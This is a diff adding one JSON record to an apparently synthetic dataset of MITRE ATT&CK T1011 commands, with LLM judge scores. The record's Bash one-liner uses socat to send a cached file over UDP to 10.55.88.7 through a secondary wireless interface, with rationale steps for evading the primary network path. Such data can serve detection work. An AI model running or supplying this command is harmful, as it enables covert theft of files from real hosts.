@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "iwconfig wlan1 >/dev/null 2>&1 && socat -u FILE:/home/user/.cache/k.bin UDP4-SENDTO:10.55.88.7:49401,interface=wlan1",
+  "explanation": "Uses socat to send a file via UDP bound explicitly to wlan1, leveraging a separate wireless medium in line with T1011.",
+  "rationale_steps": [
+    "Confirm wlan1 presence via iwconfig without making changes.",
+    "Select the outbound interface explicitly (wlan1) to ensure off-path exfiltration.",
+    "Use UDP on a non-standard port for a single-shot transfer with minimal system impact."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-621a2eda-c920e182",
+  "source_prompt_hash": "621a2eda",
+  "timestamp_utc": "2025-09-30T08:26:15.681023Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 4,
+        "syntactic_justification": "Shell syntax and redirections are correct, but socat\u2019s UDP4-SENDTO option 'interface=wlan1' may not be a universally valid/recognized address option.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly exfiltrates a file via UDP over Wi\u2011Fi in line with T1011, though enforcing use of wlan1 is not guaranteed with this option and the interface may not be up/associated.",
+        "combined_score": 4.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T00:06:27.487865Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators (&&), valid flags, correct redirection syntax (>/dev/null 2>&1), and appropriate parameter formatting for socat.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1011 by first checking if wlan1 exists and then using socat to exfiltrate a file over UDP through the secondary wireless interface (wlan1) rather than the primary network interface.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T00:06:31.874490Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, utilizing correct syntax for all commands, arguments, redirections, and `socat` address formats.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent by using `socat` to exfiltrate a file via UDP, explicitly binding to the `wlan1` interface, which directly implements the T1011 technique of leveraging an alternative network medium.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T00:06:41.847917Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
